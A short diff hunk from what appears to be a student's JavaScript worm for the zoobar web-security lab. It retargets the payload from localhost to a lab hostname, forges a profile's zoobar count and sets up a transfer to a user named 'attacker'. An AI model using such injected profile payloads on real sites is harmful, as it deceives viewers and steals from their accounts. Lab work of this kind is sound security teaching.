@@ -11,7 +11,7 @@ Born in Mexico and stealing your shaittt!
   var singquot = String.fromCharCode(39);
   document.getElementById('profileheader').innerHTML = viewed_username + singquot + 's' + space + 'zoobars:10';
 
-  var hostname = 'localhost';  
+  var hostname = 'zoobar.stanford.edu';  
 
   var zoobars = '1';
   var recipient = 'attacker';
